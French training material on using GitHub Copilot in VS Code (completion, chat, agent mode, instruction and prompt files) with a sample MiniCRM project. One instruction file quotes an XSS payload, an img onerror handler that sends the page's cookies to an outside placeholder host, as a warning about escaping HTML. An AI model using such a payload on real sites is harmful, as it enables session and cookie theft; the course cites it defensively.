# Les trois réglages à faire tout de suite (Ctrl+Shift+P -> Preferences: Open User Settings JSON)

{
  // Sans cette ligne, vos fichiers d'instructions ne sont pas lus.
  "github.copilot.chat.codeGeneration.useInstructionFiles": true,

  // Active les fichiers de prompt du dépôt (/nom-du-prompt).
  "chat.promptFiles": true,

  // Où chercher les instructions ciblées.
  "chat.instructionsFilesLocations": { ".github/instructions": true },

  // La complétion, activée là où elle sert.
  "github.copilot.enable": { "*": true, "plaintext": false, "json": false }
}
Le premier réglage est celui que tout le monde oublie. Sans lui, vous écrivez des instructions de dépôt que personne ne lit — et vous concluez, à tort, qu'elles ne servent à rien.

Complétion

Ce que voit réellement le texte gris

  • Ce qui est au-dessus du curseur dans le fichier courant : c'est le signal le plus fort.
  • Ce qui est en dessous, dans une moindre mesure.
  • Les fichiers ouverts dans vos onglets — c'est pourquoi ouvrir un fichier voisin bien écrit améliore les suggestions, immédiatement.
  • Le nom du fichier et son extension.
  • Les instructions du dépôt, si elles existent (module 3).
Ce qu'il ne voit pas : le reste du dépôt, votre base de données, vos conventions non écrites. D'où le principal levier d'amélioration : ouvrir les bons onglets avant de commencer.
Test à faire tout de suite : fermez tous les onglets sauf un, écrivez une signature de fonction, notez la suggestion. Ouvrez ensuite un fichier voisin bien écrit, recommencez. La différence est visible.

Jugement

Reconnaître une mauvaise suggestion en trois secondes

  • Elle appelle une fonction qui n'existe pas. Le modèle invente des noms plausibles : contacts.sortByAmount() n'existe pas.
  • Elle importe une bibliothèque que le projet n'utilise pas — lodash, moment, date-fns.
  • Elle ne traite pas le cas vide. Une division sans garde, un [0] sans vérification de longueur.
  • Elle change de langue. Des noms en anglais dans un projet en français : signe que vos instructions de dépôt ne sont pas lues.
  • Elle est trop longue. Vingt lignes pour une fonction qui en demandait cinq : il a inventé des besoins.
Ces cinq signaux se voient sans exécuter le code. Les repérer devient un réflexe en quelques jours — et c'est ce réflexe qui fait la différence entre un développeur augmenté et un développeur diminué.

Références

Dire de quoi vous parlez

Le contexte — #

  • #file — un fichier précis
  • #selection — ce qui est sélectionné
  • #codebase — cherche dans tout le dépôt
  • #changes — les modifications en cours
  • #terminalLastCommand — la dernière commande
  • #problems — les erreurs de l'éditeur

Les participants — @

  • @workspace — l'expert de votre projet
  • @vscode — l'éditeur lui-même
  • @terminal — les commandes shell
  • @github — issues, PR, dépôts
#codebase est celle qui change le plus les réponses : sans elle, le chat ne connaît que vos onglets ouverts. Avec elle, il cherche vraiment.
Une référence coûte des tokens. #codebase sur une question qui ne concerne qu'un fichier ralentit la réponse sans l'améliorer.
💬 Que répondriez-vous à quelqu'un qui vous demande « pourquoi ça marche pas ? » sans rien montrer ?
Générer des tests

Ce qu'il faut vérifier avant de les garder

/tests produit des tests qui passent. Ce n'est pas la même chose que des tests qui servent.

  • Le test échouerait-il si je cassais la règle ? Cassez volontairement la fonction et relancez. Si tout reste vert, le test ne teste rien.
  • Teste-t-il un comportement, ou une implémentation ? Un test qui vérifie qu'une fonction interne a été appelée casse au premier refactoring, sans qu'aucun bug n'existe.
  • Y a-t-il un cas limite ? Liste vide, valeur nulle, division par zéro, date invalide, chaîne avec un accent ou une apostrophe.
  • Le nom dit-il quelque chose ? « test1 » et « ça marche » sont des tests ratés : leur nom doit se lire comme une phrase de spécification.
Le pire résultat possible n'est pas un test manquant : c'est une suite de quarante tests verts qui ne protègent de rien. Elle donne une confiance que rien ne justifie.
💬 Cassez une fonction de votre projet. Combien de tests deviennent rouges ?
Chat en ligne

Modifier un bloc sans quitter le fichier

Ctrl+I sur une sélection. La modification apparaît en diff, directement dans le fichier : vert pour l'ajout, rouge pour la suppression.

  • Sélectionnez d'abord, demandez ensuite. Sans sélection, il devine — mal.
  • Formulez comme un ordre court : « ajoute la gestion du cas où la liste est vide », pas « peux-tu améliorer ce code ».
  • Ctrl+Entrée accepte, Échap annule.
  • Vous pouvez enchaîner : demandez un ajustement sans repartir de zéro.
C'est le mode le plus rentable de la journée : le contexte est évident (la sélection), la modification est petite, et le diff est sous vos yeux. Trois conditions de bonne relecture réunies.

Code · MiniCRM

Les instructions du dépôt, en entier

codebase_minicrm/.github/copilot-instructions.md
# Instructions Copilot — MiniCRM

## La langue
Tout est en **français** : noms de variables, de fonctions, commentaires,
messages d'erreur, textes de test. Ne traduis pas vers l'anglais,
ne renomme pas `depot` en `repository`.

## L'architecture
Quatre couches. Une couche ne connaît jamais celle du dessus.
- js/modele.js — valider, normaliser. Ne touche ni au DOM ni au stockage.
- js/depot.js — ranger, retrouver, trier. Aucune règle métier.
- js/statistiques.js — calculer. Fonctions pures, aucun effet de bord.
- js/vue.js — produire du HTML. Ne calcule rien.

## Les règles métier
1. Seul un contact au statut `client` compte dans le chiffre d'affaires.
2. Un `client` doit avoir un montant supérieur à zéro.
3. Deux contacts ne peuvent pas partager la même adresse e-mail.
4. Un contact `inactif` n'apparaît jamais dans la liste « à rappeler ».

## Interdits
- Ajouter une dépendance npm, TypeScript, un bundler ou un framework.
- Écrire dans du HTML une valeur non passée par Vue.echapper().
- Modifier un test pour le faire passer.
Gardez ce fichier court. Des instructions longues sont diluées ; des instructions contradictoires sont ignorées. Une page, pas trois.

Code · MiniCRM

Une instruction ciblée sur un seul dossier

codebase_minicrm/.github/instructions/vue.instructions.md
---
applyTo: "js/vue.js"
---

# Règle absolue de ce fichier

**Toute valeur venue de l'utilisateur passe par `echapper()` avant d'entrer
dans une chaîne HTML.** Sans exception, y compris pour un identifiant
ou un nombre.

Sans cela, un contact nommé
`<img src=x onerror="fetch('https://ailleurs/'+document.cookie)">`
exécute ce code chez toutes les personnes qui ouvrent la fiche.
C'est la faille XSS, la plus répandue du web.

Ce fichier **ne calcule rien**. S'il te faut un total, un tri ou un filtre,
il manque une fonction dans statistiques.js ou depot.js : c'est là
qu'il faut l'écrire.

Prévois toujours l'état vide : une liste sans résultat affiche un message
utile, jamais un tableau nu.
Le champ applyTo accepte un motif glob : "tests/**/*.js", "**/*.sql". On donne la bonne règle au bon endroit, sans alourdir les instructions générales.

Code · MiniCRM

Un fichier de prompt réutilisable

codebase_minicrm/.github/prompts/completer-fonction.prompt.md
---
mode: agent
description: Complète une fonction laissée en TODO, en partant des tests.
---

Complète la fonction `${input:fonction:nom de la fonction}`
dans `js/statistiques.js`.

Procède dans cet ordre :

1. Lis le bloc JSDoc : il énonce les règles, une par une.
2. Lis les tests qui la concernent dans tests/statistiques.test.js :
   ils sont la spécification exacte, plus précise que la JSDoc.
3. Écris l'implémentation. Fonction PURE : aucun effet de bord,
   pas de modification du tableau reçu en paramètre.
4. Lance `node run-tests.js` et vérifie que les 90 tests passent.
5. Résume en trois lignes ce que tu as écrit et pourquoi.

Contraintes : français, deux espaces d'indentation, aucune dépendance,
aucune modification des tests.
S'invoque avec /completer-fonction. Le champ mode choisit l'exécution : ask (répond), edit (modifie), agent (fait tout, y compris lancer les tests).

Refactoriser

La demande qui marche, et celle qui échoue

Ce qui échoue

« Améliore ce fichier. »
  • Il renomme des choses au passage
  • Il ajoute une abstraction inutile
  • Il supprime un cas que vous aviez traité exprès
  • Le diff fait 200 lignes, vous ne le relisez pas

Ce qui marche

« Extrais la validation de l'e-mail dans une fonction dédiée. Ne change aucun nom public, ne touche pas aux tests, et dis-moi ensuite quelles lignes ont bougé. »
  • Une seule intention
  • Des invariants explicites
  • Un diff court, donc relu
  • Un résumé des changements, pour vérifier
C'est la même règle qu'au jour 2 : un prompt de modification dit ce qui change et ce qui ne doit pas changer. La seconde moitié est celle que tout le monde oublie.

Module 4

Edits et mode agent

Plusieurs fichiers d'un coup. C'est puissant, et c'est exactement là qu'il faut ralentir.

Edits

Modifier plusieurs fichiers en une demande

  • Ctrl+Shift+I ouvre la vue Edits.
  • Ajoutez explicitement les fichiers concernés au contexte. Ne comptez pas sur la devinette : elle rate un fichier sur trois.
  • Décrivez la tâche, pas les étapes. « Ajoute le champ téléphone » plutôt que « ouvre modele.js, ajoute une ligne, puis… ».
  • Le résultat arrive en diff, fichier par fichier. On accepte ou on refuse chacun séparément.
  • Refuser un fichier et garder les autres est parfaitement normal — et c'est souvent la bonne décision.
Le mode Edits est le bon compromis : plus large que le chat en ligne, mais vous gardez la main fichier par fichier. Pour une tâche de moins de cinq fichiers, préférez-le au mode agent.
💬 Quelle modification de votre projet touche exactement trois fichiers ?
Mode agent

Quand il travaille tout seul

  • Il choisit lui-même les fichiers à lire et à modifier, lance des commandes, lit les erreurs et recommence.
  • Il vous demande l'autorisation avant chaque commande de terminal — lisez-les, ne validez pas en série.
  • Il s'arrête quand il pense avoir fini. « Il pense » : c'est vous qui décidez si c'est vrai.
  • Vous pouvez l'interrompre à tout moment sans perdre la conversation.
Le mode agent est le seul où une seule phrase peut produire deux cents lignes réparties dans six fichiers. Deux règles, sans exception : travaillez sur une branche, et relisez le diff en entier avant de valider.
La bonne demande en mode agent est une tâche vérifiable : « fais passer les tests de statistiques.test.js ». Il sait quand il a fini, et vous aussi.

Personnaliser

Un agent maison, pour un rôle précis

.github/agents/relecteur.agent.md
---
name: relecteur
description: Relit une modification avec l'oeil d'un développeur senior.
tools: ['codebase', 'search', 'problems']
---

Tu relis le code d'un collègue sur MiniCRM. Les règles du projet sont dans
.github/copilot-instructions.md. Lis-les en premier.

Tu cherches, dans cet ordre :

1. une RÈGLE MÉTIER cassée — le seul défaut qui ne fait pas planter le
   programme mais donne un chiffre faux ;
2. une valeur non échappée qui entre dans du HTML ;
3. une fonction placée dans la mauvaise couche ;
4. un cas limite non testé ;
5. un commentaire qui répète le code.

Tu réponds par une liste, du plus grave au moins grave : fichier et ligne,
le problème en une phrase, la correction en une phrase.

Tu ne modifies aucun fichier : tu relis, tu ne corriges pas.
Deux détails qui font tout : la liste tools ne contient aucun outil d'écriture, et la dernière phrase le répète en toutes lettres. Un relecteur qui corrige lui-même ne relit plus rien.

Choisir

Plusieurs modèles, un sélecteur

Le sélecteur en bas du chat permet de changer de modèle en cours de conversation. Le bon réflexe n'est pas de prendre le plus puissant : c'est de prendre le moins cher qui fait le travail.

Le besoinCe qu'il faut
Compléter une fonction dont le contrat est écritLe modèle rapide par défaut. Le plus gros n'apportera rien.
Comprendre un fichier hérité de 800 lignesUn modèle à grande fenêtre de contexte.
Choisir entre deux approches d'architectureUn modèle de raisonnement — et un humain qui tranche.
Faire passer une suite de tests en mode agentUn modèle de raisonnement : la boucle essai-erreur en profite vraiment.
Reformuler un commentaireN'importe lequel. Ce choix n'a aucune importance ici.
Sur un forfait à l'usage, le choix du modèle est le premier levier de coût — exactement comme au jour 2, avec le même rapport de 1 à 40.

Sécurité

Ce qui part réellement de votre machine

  • La complétion envoie le fichier courant et des extraits des fichiers ouverts.
  • Le chat envoie ce que vous référencez, plus les instructions du dépôt.
  • #codebase envoie des extraits trouvés par recherche dans tout le dépôt.
  • Le mode agent envoie tout ce qu'il décide de lire — vous ne choisissez pas.
  • Le filtrage du code public correspondant et l'exclusion de fichiers se règlent dans les paramètres de l'organisation, pas dans votre éditeur.
Vérifiez avec votre direction informatique ce qui est autorisé avant de pointer un assistant sur un dépôt client. Cette question relève du contrat, pas de la technique — et elle ne se rattrape pas après coup.
Réflexe simple et suffisant dans 90 % des cas : un .env ou un fichier de secrets ne doit jamais être ouvert dans un onglet pendant que vous travaillez avec un assistant.

Pratique

Trois exercices sur MiniCRM. Le guide pas à pas est dans Exercices_guides_GitHub_Copilot.html.

🔧 Travaux pratiques

Compléter par la complétion

50 minutes · seul · <code class="inline">js/statistiques.js</code>
  1. Ouvrez le dossier dans VS Code et lancez node run-tests.js : 8 tests en échec. C'est votre cahier des charges.
  2. Ouvrez js/statistiques.js et lisez les quatre // TODO.
  3. Sans rien ouvrir d'autre, placez le curseur dans meilleursClients(). Notez la suggestion.
  4. Ouvrez maintenant tests/statistiques.test.js dans un second onglet, revenez, redemandez (Alt+\). Notez la différence.
  5. Acceptez avec Ctrl+→, mot à mot, en relisant.
  6. Faites contactsDormants() avec Ctrl+I sur la fonction.
  7. node run-tests.js après chaque fonction.
Livrable : deux fonctions complétées, les tests correspondants au vert, et une phrase écrite sur ce qu'a changé l'ouverture du fichier de tests.
🔧 Travaux pratiques

Edits, agent, et relecture

1 h 10 · en binôme
  1. Ctrl+Shift+I : demandez parMois() et son branchement dans js/app.js. Deux fichiers, une demande.
  2. Acceptez fichier par fichier. Refusez-en un volontairement, pour voir ce qui se passe.
  3. Passez en mode agent et demandez : « fais passer tous les tests de tests/statistiques.test.js ».
  4. Laissez-le travailler sans intervenir. Chronométrez. Puis lisez le diff en entier.
  5. Cherchez trois choses : a-t-il modifié un test ? A-t-il ajouté une dépendance ? A-t-il touché un fichier hors sujet ?
  6. Dans le chat : /relire (le fichier de prompt du projet).
  7. Comparez ce que dit la relecture à ce que vous aviez vu vous-même.
Livrable : les 90 tests au vert, le tableau de bord complet dans index.html, et la liste écrite de ce que l'agent a fait et que vous n'aviez pas demandé.
🔧 Travaux pratiques

Industrialiser pour l'équipe

50 minutes · en binôme
  1. Modifiez .github/copilot-instructions.md : ajoutez une règle de style bien à vous (par exemple : « pas de fonction fléchée en dehors des callbacks »).
  2. Demandez une nouvelle fonction. La règle est-elle respectée ? Sinon, reformulez-la : une instruction floue est ignorée.
  3. Créez .github/instructions/depot.instructions.md, avec applyTo: "js/depot.js" et une règle absolue propre à ce fichier.
  4. Écrivez un fichier de prompt .github/prompts/ajouter-champ.prompt.md qui ajoute un champ au modèle : validation, test, formulaire, affichage.
  5. Lancez-le avec /ajouter-champ pour ajouter un champ téléphone.
  6. Relisez tout, lancez les tests, faites un commit.

Mesurer

Le gain réel, et comment le savoir

  • Ce qui augmente vraiment : la vitesse d'écriture du code qu'on sait déjà écrire, la couverture de tests, la qualité des messages de commit, la vitesse de reprise d'un fichier inconnu.
  • Ce qui n'augmente pas : la qualité des décisions d'architecture, la connaissance de votre métier, la pertinence de vos priorités.
  • Ce qui peut baisser : votre attention en relecture, et votre mémoire des API que vous n'écrivez plus vous-même.
  • Le seul indicateur qui compte : le nombre de retours en arrière et d'incidents en production — pas le nombre de lignes produites.
Se donner un indicateur de lignes produites, c'est se garantir de produire des lignes. Une équipe qui mesure la vitesse obtiendra de la vitesse, y compris quand ce n'est pas ce dont elle a besoin.
